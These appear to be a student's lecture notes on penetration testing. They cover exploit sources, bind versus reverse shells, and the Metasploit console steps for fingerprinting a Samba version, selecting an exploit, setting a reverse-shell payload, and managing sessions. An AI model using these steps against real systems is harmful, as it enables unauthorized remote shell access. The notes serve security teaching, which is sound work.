# Lecture 3

- First thing to do after having a initial foothold
  - check for backdoors
  - exploit it using netcat(nc)
- exploit code sources
  - github
    - might not be practical
  - metasploit
  - exploitDB
- Payload objectives
  - run a shell
  - escalate previlige
  - meterpreter
    - allows commands more tailored for attacker

- Bind shell vs Reverse shell
  - Bind shell
    - payload sent from attacker to victim
    - shell process opens in victim, listens at some port like a server
    - attacker later initiate a connection.
  - Reverse sehll
    - payload sent from attacker to victim
    - shell process opens in victim, initiate connection to attacker
  - why use revers shell
    - firewall rules are tougher for inwards packets
  - will be in incident 2

- `nc {ip address}`
- `telnet {ip address}`
- `rlogin {ip address}`

- important to know exact version of a program to exploit
`msfconsole`
`search samba`
- to choose a module
`use auxilary/.../smb_version`
- to deactivate a module
`back`
- set target machine
`set RHOSTS {ip address}`
- run, to find the version
`run`
- find exploits
`search samba {version number}`
- use an exploit
`use {bug number from previous output}`
`set RHOSTS`
`set PAYLOAD unix/.../reverse`
`set LHOST`
`set LPORT`
- what is the link bewteen the shell being opened remotely and no arrow is being present?
- put the sell in background
`<C-Z>`
- list sessions
`sessions -l`
- enter session
`sessions -i {number}`
